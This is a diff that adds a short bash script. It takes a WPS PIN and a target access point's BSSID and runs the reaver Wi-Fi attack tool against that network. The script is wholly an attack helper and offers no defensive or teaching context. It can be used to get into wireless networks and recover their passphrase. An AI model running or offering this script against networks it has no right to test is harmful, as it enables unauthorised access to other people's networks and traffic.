@@ -1,0 +1,9 @@
+#!/bin/bash
+if [ -z "$1" ] || [ -z "$2" ]; then
+   echo "Usage:";
+   echo "$0 [PIN] [BSSID]";
+   echo "Example usage:"
+   echo "$0 12345679 AA:BB:CC:DD:EE:FF";
+   exit;
+fi
+reaver -p $1 -i mon0 -b $2 -vv -t 20 -g 1 -S -N
